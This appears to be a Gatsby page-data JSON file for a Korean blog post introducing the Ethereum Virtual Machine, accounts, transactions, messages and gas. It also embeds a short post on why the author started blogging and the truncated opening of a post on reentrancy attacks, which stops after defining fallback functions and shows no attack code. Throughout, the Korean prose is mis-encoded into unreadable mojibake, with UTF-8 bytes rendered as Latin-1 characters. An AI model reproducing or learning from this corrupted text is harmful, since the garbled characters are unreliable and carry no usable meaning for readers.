{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/evm/",
    "result": {"data":{"cur":{"id":"b1747e78-df12-5900-95c5-2c26d5a5a44b","html":"<h1 id=\"-evmethereum-virtual-machine-ê·¸ê²Œ-ë­”ë°\" style=\"position:relative;\"><a href=\"#-evmethereum-virtual-machine-%EA%B7%B8%EA%B2%8C-%EB%AD%94%EB%8D%B0\" aria-label=\" evmethereum virtual machine ê·¸ê²Œ ë­”ë° permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ EVM(Ethereum Virtual Machine)? ê·¸ê²Œ ë­”ë°?</h1>\n<p>solidityë¡œ smart contractë¥¼ ì‘ì„±í•˜ë©´ì„œ <strong>gas optimization</strong> ë“±ì— ëŒ€í•´ ê¹Šì´ ì•Œê¸°ìœ„í•´ EVMì„ ê³µë¶€ë¥¼ ì‹œì‘í•˜ì˜€ë‹¤!</p>\n<h2 id=\"1-virtual-machine\" style=\"position:relative;\"><a href=\"#1-virtual-machine\" aria-label=\"1 virtual machine permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. Virtual Machine?</h2>\n<p>ë¨¼ì € Virtual Machine(ê°€ìƒ ë¨¸ì‹ )ì´ë€ ë­˜ê¹Œ?<br>\nê°€ìƒë¨¸ì‹ ì´ë€ ë¬¼ë¦¬ì ìœ¼ë¡œ ì¡´ì¬í•˜ëŠ” ì»´í“¨í„°ëŠ” ì•„ë‹ˆì§€ë§Œ ì‹¤ì œ ì»´í“¨í„°ì²˜ëŸ¼ ì‘ë™í•˜ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ì´ë‹¤. ê°€ìƒë¨¸ì‹ ì„ ì‚¬ìš©í•˜ê²Œ ë˜ë©´ í•˜ë‚˜ì˜ ì»´í“¨í„°ë¡œ 2ê°€ì§€ ì´ìƒì˜ ìš´ì˜ì²´ì œë¥¼ ì‹¤í–‰ í•  ìˆ˜ ìˆê³ , ìƒí˜¸ê°„ ì¶©ëŒì„ ì—†ì•¨ ìˆ˜ ìˆë‹¤.<br>\në‚˜ëŠ” ìš°ë¶„íˆ¬ë¥¼ ì‚¬ìš©í–ˆì—ˆëŠ”ë°, ì—­ì‹œ ì‚¬ìš©í•˜ë©´ì„œ ë°°ìš°ëŠ”ê²Œ ìµœê³ ì¸ ê²ƒ ê°™ë‹¤.</p>\n<h2 id=\"2-evmethereum-virtual-machine\" style=\"position:relative;\"><a href=\"#2-evmethereum-virtual-machine\" aria-label=\"2 evmethereum virtual machine permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2. EVM(Ethereum Virtual Machine)</h2>\n<p>ì´ë”ë¦¬ì›€ ë…¸ë“œë“¤ì´ ê³µìœ í•˜ëŠ” í•˜ë‚˜ì˜ ê°€ìƒ ë¨¸ì‹ ì´ë‹¤. ëª¨ë‘ê°€ ë‹¤ ê°™ì´ ì‚¬ìš©í•˜ê¸°ì— â€œWorld Computerâ€ì´ë¼ê³ ë„ ë¶ˆë¦°ë‹¤. ê·¸ë¦¬ê³  ìŠ¤ë§ˆíŠ¸ ì»¨íŠ¸ë™íŠ¸ì˜ ë°°í¬ì™€ ì‹¤í–‰ì„ ì²˜ë¦¬í•˜ëŠ” ì´ë”ë¦¬ì›€ì˜ ì¼ë¶€ì´ë‹¤. EVMì•ˆì— ë°°í¬ëœ ì½”ë“œëŠ” ë‹¤ë¥¸ í”„ë¡œì„¸ìŠ¤ë“¤ê³¼ ì™„ì „íˆ ê²©ë¦¬ë˜ì–´ìˆë‹¤.EVMì˜ ì—­í• ì€ ë°ì´í„°ì˜ ë³€í™”, ë³€ê²½í•˜ëŠ” ë°ì´í„°ì˜ ì¶©ëŒê³¼ ë³´ì•ˆì„ ë‹´ë‹¹í•œë‹¤.</p>\n<h2 id=\"3-accountsë€\" style=\"position:relative;\"><a href=\"#3-accounts%EB%9E%80\" aria-label=\"3 accountsë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>3. Accountsë€?</h2>\n<p>ë‘ê°€ì§€ ì¢…ë¥˜ì˜ ê³„ì •(Accounts)ê°€ ì¡´ì¬í•œë‹¤. ë‘ ê³„ì •ì—ëŠ” ëª¨ë‘ etherë¥¼ ë³´ê´€í•  ìˆ˜ ìˆë‹¤. AccountëŠ” ì¢…ë¥˜ì— ë¶ˆë¬¸í•˜ê³  4ê°€ì§€ë¡œ êµ¬ì„±ë˜ì–´ìˆë‹¤.</p>\n<ol>\n<li>Nonce</li>\n<li>Balance</li>\n<li>storageRoot</li>\n<li>CodeHash</li>\n</ol>\n<ul>\n<li>EOA(Externally Owned Accounts)</li>\n</ul>\n<p>EOAëŠ” Private Keyë¥¼ í†µí•´ ê´€ë¦¬ëœë‹¤. ê·¸ë ‡ê¸° ë•Œë¬¸ì— private keyê°€ ìˆë‹¤ë©´ EOAë¥¼ ì–¸ì œë‚˜ ë‹¤ì‹œ ìƒì„±í•  ìˆ˜ ìˆê³ , ì„œëª…ì„ í†µí•´ transactionì„ ë³´ë‚¼ ìˆ˜ ìˆë‹¤.</p>\n<ul>\n<li>CA(Contract Account)</li>\n</ul>\n<p>CAëŠ” smart contractë¥¼ í†µí•´ ê´€ë¦¬ëœë‹¤. smart walletì´ë¼ê³ ë„ ë¶ˆë¦¬ìš´ë‹¤. smart contractë¡œ ê´€ë¦¬ë˜ê¸° ë•Œë¬¸ì— EOA ë˜ëŠ” ë‹¤ë¥¸ contractì—ì„œ ë³´ë‚´ëŠ” transactionê³¼ ë©”ì„¸ì§€ë¥¼ í†µí•´ ì‹¤í–‰ë  ìˆ˜ ìˆë‹¤. ê²°êµ­ ëª¨ë“  transactionì€ EOAë¡œë¶€í„° ì‹œì‘ëœë‹¤.</p>\n<p>ë‘ê°€ì§€ ê³„ì •ì´ ì¡´ì¬í•˜ì§€ë§Œ EVMì—ì„œëŠ” ë™ì¼í•˜ê²Œ ì·¨ê¸‰í•œë‹¤.</p>\n<h2 id=\"transactionì´ë€\" style=\"position:relative;\"><a href=\"#transaction%EC%9D%B4%EB%9E%80\" aria-label=\"transactionì´ë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Transactionì´ë€?</h2>\n<p>ì´ë”ë¦¬ì›€ì—ì„œ Transcationì´ë€ ì„œëª…ëœ <strong>ë°ì´í„° í˜í‚¤ì§€ì´ë‹¤.</strong> ë°ì´í„° í˜í‚¤ì§€ì—ëŠ” nonce, to, signature, value, data(optional), gaslimit, gaspriceì— ëŒ€í•œ ì •ë³´ ë“±ì´ ì €ì¥ë˜ì–´ìˆë‹¤.<br>\netherë¥¼ ê³„ì •ë“¤ì—ê²Œ ë³´ë‚´ê±°ë‚˜, smart contract ë°°í¬í•˜ê±°ë‚˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí• ë•Œ ì‚¬ìš©ëœë‹¤.</p>\n<h2 id=\"messageë€\" style=\"position:relative;\"><a href=\"#message%EB%9E%80\" aria-label=\"messageë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Messageë€?</h2>\n<p>ë©”ì„¸ì§€ëŠ” Transactionê³¼ <strong>EOAê°€ ì•„ë‹Œ contractê°€</strong> ìƒì„±í•œë‹¤ëŠ” ê²ƒ ì™¸ì— êµ‰ì¥íˆ ë¹„ìŠ·í•˜ë‹¤. í° ì°¨ì´ì ì€ Gas Limitë¥¼ ì„¤ì •í•  í•„ìš”ê°€ ì—†ë‹¤ëŠ” ê²ƒì´ë‹¤. EOAê°€ ì²˜ìŒ Transactionì„ ë³´ë‚¼ë•Œ ì´ë¯¸ ì„¤ì •í•˜ê¸° ë•Œë¬¸ì´ë‹¤. ê²°êµ­ EOAê°€ Transactionì„ ë³´ë‚´ì§€ ì•ŠëŠ”ë‹¤ë©´ MessageëŠ” ìƒì„±ë  ìˆ˜ ì—†ë‹¤.</p>\n<h2 id=\"gasë€\" style=\"position:relative;\"><a href=\"#gas%EB%9E%80\" aria-label=\"gasë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gasë€?</h2>\n<p>GasëŠ” ì •í•´ì ¸ìˆëŠ” ì—°ì‚° ë¹„ìš©ì´ë‹¤. ì¦‰ ë§ì€ ì—°ì‚°ì„ í•  ìˆ˜ë¡ ë§ì€ gasê°€ ì†Œëª¨ëœë‹¤. ì´ ìˆ˜ìˆ˜ë£ŒëŠ” <strong>Gas Price * Gasì˜ ì´ ì–‘</strong> ìœ¼ë¡œ ê²°ì •ëœë‹¤. ë§Œì•½ í•´ì»¤ì¹´ DOS ê³µê²©ì„ ì‹œë„í•œë‹¤ë©´ transactionì— ë¹„ë¡€í•´ gasë¥¼ ì§€ë¶ˆí•´ì•¼í•œë‹¤.\r\nê·¸ë ‡ê¸° ë•Œë¬¸ì— GasëŠ” ì´ë”ë¦¬ì›€ì— ê¼­ í•„ìš”í•œ ìš”ì†Œì¤‘ í•˜ë‚˜ë¼ê³  ìƒê°í•œë‹¤. Gas limitê³¼ gas priceë¥¼ í†µí•´ anti-Dosëª¨ë¸ì„ ìœ ì§€ì‹œí‚¬ ìˆ˜ ìˆë‹¤.</p>\n<hr>\n<p>ì²˜ìŒìœ¼ë¡œ ë‚´ê°€ ê³µë¶€í•œ ë‚´ìš©ì„ ê¸€ë¡œ ë‹´ì•„ë³´ì•˜ë‹¤. ì•„ë§ˆ ì„¤ëª…ì´ ë¶€ì¡±í•œ ë¶€ë¶„ì´ ë§ì•˜ìœ¼ë¦¬ë¼ê³  ìƒê°í•œë‹¤. ì•ìœ¼ë¡œ ë§ì€ ê¸€ì„ ì“°ë©° ë” ê³µë¶€í•˜ê³  ê³µë¶€í•œ ê²ƒì„ ì˜ ì„¤ëª…í•˜ê³  ì‹¶ë‹¤.</p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#1-virtual-machine\">1. Virtual Machine?</a></li>\n<li><a href=\"#2-evmethereum-virtual-machine\">2. EVM(Ethereum Virtual Machine)</a></li>\n<li><a href=\"#3-accounts%EB%9E%80\">3. Accountsë€?</a></li>\n<li><a href=\"#transaction%EC%9D%B4%EB%9E%80\">Transactionì´ë€?</a></li>\n<li><a href=\"#message%EB%9E%80\">Messageë€?</a></li>\n<li><a href=\"#gas%EB%9E%80\">Gasë€?</a></li>\n</ul>\n</div>","excerpt":"ğŸ‘‹ EVM(Ethereum Virtual Machine)? ê·¸ê²Œ ë­”ë°? solidityë¡œ smart contractë¥¼ ì‘ì„±í•˜ë©´ì„œ gas optimization ë“±ì— ëŒ€í•´ ê¹Šì´ ì•Œê¸°ìœ„í•´ EVMì„ ê³µë¶€ë¥¼ ì‹œì‘í•˜ì˜€ë‹¤! 1. Virtual Machine? ë¨¼ì € Virtual Machine(ê°€ìƒ ë¨¸ì‹ )ì´ë€ ë­˜ê¹Œ? ê°€ìƒë¨¸ì‹ ì´ë€ ë¬¼ë¦¬ì ìœ¼ë¡œ ì¡´ì¬í•˜ëŠ” ì»´í“¨í„°ëŠ” ì•„ë‹ˆì§€ë§Œ ì‹¤ì œ ì»´í“¨í„°ì²˜ëŸ¼ ì‘ë™í•˜ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ì´ë‹¤. ê°€ìƒë¨¸ì‹ ì„ ì‚¬ìš©í•˜ê²Œ ë˜ë©´ í•˜ë‚˜ì˜ ì»´í“¨í„°ë¡œ 2ê°€ì§€ ì´ìƒì˜ ìš´ì˜ì²´ì œë¥¼ ì‹¤í–‰ í•  ìˆ˜ ìˆê³ , ìƒí˜¸ê°„ ì¶©ëŒì„ ì—†ì•¨ ìˆ˜ ìˆë‹¤. ë‚˜ëŠ” ìš°ë¶„íˆ¬ë¥¼ ì‚¬ìš©í–ˆì—ˆëŠ”ë°, ì—­ì‹œ ì‚¬ìš©í•˜ë©´ì„œ ë°°ìš°ëŠ”ê²Œ ìµœê³ ì¸ ê²ƒ ê°™ë‹¤. 2. EVM(Ethereum Virtual Machine) ì´ë”ë¦¬ì›€ ë…¸ë“œë“¤ì´ ê³µìœ í•˜ëŠ” í•˜ë‚˜ì˜ ê°€ìƒ ë¨¸ì‹ ì´ë‹¤. ëª¨ë‘ê°€ ë‹¤ ê°™ì´ ì‚¬ìš©í•˜ê¸°ì— â€œWorld Computerâ€ì´ë¼ê³ ë„ ë¶ˆë¦°ë‹¤. ê·¸ë¦¬ê³  ìŠ¤ë§ˆíŠ¸ ì»¨íŠ¸ë™íŠ¸ì˜ ë°°í¬ì™€ ì‹¤í–‰ì„ ì²˜ë¦¬í•˜ëŠ” ì´ë”ë¦¬ì›€ì˜ ì¼ë¶€ì´ë‹¤. EVMì•ˆì— ë°°í¬ëœ ì½”ë“œëŠ” ë‹¤ë¥¸ í”„ë¡œì„¸ìŠ¤ë“¤ê³¼ ì™„ì „íˆ ê²©ë¦¬ë˜â€¦","frontmatter":{"date":"December 13, 2021","title":"EVM(Ethereum Virtual Machine)? ê·¸ê²Œ ë­”ë°?","categories":"ethereum","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/evm/"}},"next":{"id":"b1d8d626-9e8c-56e1-9d4c-bbd3bb5e03ea","html":"<h1 id=\"-ë¸”ë¡œê·¸ë¥¼-ì‹œì‘í•œ-ì´ìœ \" style=\"position:relative;\"><a href=\"#-%EB%B8%94%EB%A1%9C%EA%B7%B8%EB%A5%BC-%EC%8B%9C%EC%9E%91%ED%95%9C-%EC%9D%B4%EC%9C%A0\" aria-label=\" ë¸”ë¡œê·¸ë¥¼ ì‹œì‘í•œ ì´ìœ  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ ë¸”ë¡œê·¸ë¥¼ ì‹œì‘í•œ ì´ìœ ?</h1>\n<h2 id=\"1-ë°°ìš´ê²ƒì—-ëŒ€í•œ-ë‚´ìš©-ì •ë¦¬\" style=\"position:relative;\"><a href=\"#1-%EB%B0%B0%EC%9A%B4%EA%B2%83%EC%97%90-%EB%8C%80%ED%95%9C-%EB%82%B4%EC%9A%A9-%EC%A0%95%EB%A6%AC\" aria-label=\"1 ë°°ìš´ê²ƒì— ëŒ€í•œ ë‚´ìš© ì •ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. ë°°ìš´ê²ƒì— ëŒ€í•œ ë‚´ìš© ì •ë¦¬</h2>\n<p>ë¬´ì–¸ê°€ë¥¼ ë°°ìš°ê³  ê¸€ë¡œ ë‚¨ê¸°ëŠ” ê²ƒì´ êµ‰ì¥íˆ ì¤‘ìš”í•˜ë‹¤ê³  ìƒê°í•œë‹¤. ë¸”ë¡œê·¸ë¥¼ í†µí•´ ì•ìœ¼ë¡œ ë°°ìš¸ ê²ƒ ë“¤ì— ëŒ€í•œ ê¸°ë¡ì„ ë‚¨ê¸°ê³  ì‹¶ì–´ ì‹œì‘í•œë‹¤.</p>\n<h2 id=\"2-ë‚´-ìƒê°-ì •ë¦¬--ê¸€ì“°ëŠ”-ë²•\" style=\"position:relative;\"><a href=\"#2-%EB%82%B4-%EC%83%9D%EA%B0%81-%EC%A0%95%EB%A6%AC--%EA%B8%80%EC%93%B0%EB%8A%94-%EB%B2%95\" aria-label=\"2 ë‚´ ìƒê° ì •ë¦¬  ê¸€ì“°ëŠ” ë²• permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2. ë‚´ ìƒê° ì •ë¦¬ &#x26; ê¸€ì“°ëŠ” ë²•</h2>\n<p>ë‚´ê°€ ë°°ìš´ ê²ƒê³¼ ìƒê°ì„ ì˜ ì •ë¦¬í•´ ê¸€ë¡œ ë‚˜íƒ€ë‚´ê³  ì „ë‹¬í•˜ëŠ” ê²ƒì€ ì–´ë µë‹¤. ë¸”ë¡œê·¸ë¥¼ í†µí•´ <strong>ì˜ì‚¬ì†Œí†µ</strong> ì— ì¤‘ìš”í•œ ì •í™•í•œ ì •ë³´ ì •ë¦¬ ë° ì „ë‹¬ì„ ë°°ìš°ê³  ì‹¶ë‹¤.</p>\n<h1 id=\"\" style=\"position:relative;\"><a href=\"#\" aria-label=\" permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a></h1>\n<p>ì•ìœ¼ë¡œ ë¸”ë¡œê·¸ì—ëŠ” ê°œë°œ ê´€ë ¨ ê³µë¶€ ìë£Œ ë° ë‚´ê°€ í–ˆë˜ ê²½í—˜ì— ëŒ€í•´ ì •ë¦¬í•´ ì—…ë¡œë“œ í•  ì˜ˆì •ì´ë‹¤.</p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#1-%EB%B0%B0%EC%9A%B4%EA%B2%83%EC%97%90-%EB%8C%80%ED%95%9C-%EB%82%B4%EC%9A%A9-%EC%A0%95%EB%A6%AC\">1. ë°°ìš´ê²ƒì— ëŒ€í•œ ë‚´ìš© ì •ë¦¬</a></li>\n<li><a href=\"#2-%EB%82%B4-%EC%83%9D%EA%B0%81-%EC%A0%95%EB%A6%AC--%EA%B8%80%EC%93%B0%EB%8A%94-%EB%B2%95\">2. ë‚´ ìƒê° ì •ë¦¬ &#x26; ê¸€ì“°ëŠ” ë²•</a></li>\n</ul>\n</div>","frontmatter":{"date":"December 07, 2021","title":"ë¸”ë¡œê·¸ë¥¼ ì‹œì‘í•œ ì´ìœ ?","categories":"feature","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/startingBlog/"}},"prev":{"id":"bbced782-f109-5c42-9522-c570827ac521","html":"<h1 id=\"-reentrancy-attack-ì¬ì§„ì…-ê³µê²©\" style=\"position:relative;\"><a href=\"#-reentrancy-attack-%EC%9E%AC%EC%A7%84%EC%9E%85-%EA%B3%B5%EA%B2%A9\" aria-label=\" reentrancy attack ì¬ì§„ì… ê³µê²© permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ Reentrancy Attack (ì¬ì§„ì… ê³µê²©)</h1>\n<h2 id=\"ë“¤ì–´ê°€ê¸°ì „\" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84\" aria-label=\"ë“¤ì–´ê°€ê¸°ì „ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë“¤ì–´ê°€ê¸°ì „</h2>\n<h3 id=\"fallback-í•¨ìˆ˜\" style=\"position:relative;\"><a href=\"#fallback-%ED%95%A8%EC%88%98\" aria-label=\"fallback í•¨ìˆ˜ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fallback í•¨ìˆ˜?</h3>\n<p>Fallback í•¨ìˆ˜ëŠ” contractì—ì„œ í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¬ë•Œ í•¨ìˆ˜ê°€ ì¡´ì¬í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ ì‹¤í–‰ë˜ëŠ” functionì´ë‹¤.\r\n0.6ì´ì „ ë²„ì „ì—ì„œëŠ” fallbackì´ etherëŠ” ê²ƒê³¼ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” í•¨ìˆ˜ì˜ ëŒ€ë¹„ì±…ìœ¼ë¡œ ì‚¬ìš©ë˜ì—ˆì§€ë§Œ 0.6 ì´í›„ ë²„ì „ë¶€í„° fallbackì€ fallbackê³¼ receiveë¡œ ë‚˜ëˆ„ì–´ì¡Œë‹¤. 0.6ë¶€í„°ëŠ” fallbackì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  receiveë¥¼ í†µí•´ ì´ë”ë¥¼ ë°›ì„ ìˆ˜ ìˆë‹¤.</p>\n<h2 id=\"reentrancy-attackì¬ì§„ì…-ê³µê²©ì´ë€\" style=\"position:relative;\"><a 